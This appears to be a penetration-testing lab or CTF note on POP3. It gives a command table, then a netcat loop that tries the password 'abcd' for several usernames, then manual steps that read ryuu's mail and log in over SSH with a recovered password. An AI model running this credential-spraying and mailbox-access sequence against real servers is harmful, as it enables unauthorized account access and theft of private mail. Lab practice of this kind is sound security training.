#### POP3 Commands

|**Command**|**Description**|
|---|---|
|`USER username`|Identifies the user.|
|`PASS password`|Authentication of the user using its password.|
|`STAT`|Requests the number of saved emails from the server.|
|`LIST`|Requests from the server the number and size of all emails.|
|`RETR id`|Requests the server to deliver the requested email by ID.|
|`DELE id`|Requests the server to delete the requested email by ID.|
|`CAPA`|Requests the server to display the server capabilities.|
|`RSET`|Requests the server to reset the transmitted information.|
|`QUIT`|Closes the connection with the POP3 server.|

#### POP3.sh

---
```bash - kali
for user in marcus john mailadmin jenny ryuu joe45; do

 ( echo USER ${user}; sleep 2s; echo PASS abcd; sleep 2s; echo LIST; sleep 2s; echo quit) | nc -nvC $TARGET 110; done
```

```
chmod +x pop3.sh
```

```
./pop3.sh
```

---

If script above does not work, do manually:

We see Ryuu has 2 messages.

```bash - kali
nc -nvC $TARGET 110
```

```bash - kali
USER ryuu
```

```bash - kali
PASS abcd
```

```bash - kali
RETR 1
```

```bash - kali
RETR 2
```

```bash - kali
ssh ryuu@$TARGET
```

```bash - kali
QUHqhUPRKXMo4m7k
```

#### OpenSSL - TLS Encrypted Interaction POP3
```
openssl s_client -connect $TARGET:pop3s

```

```shell-session
curl -k 'pop3s://$TARGET' --user username:pasword -v
```
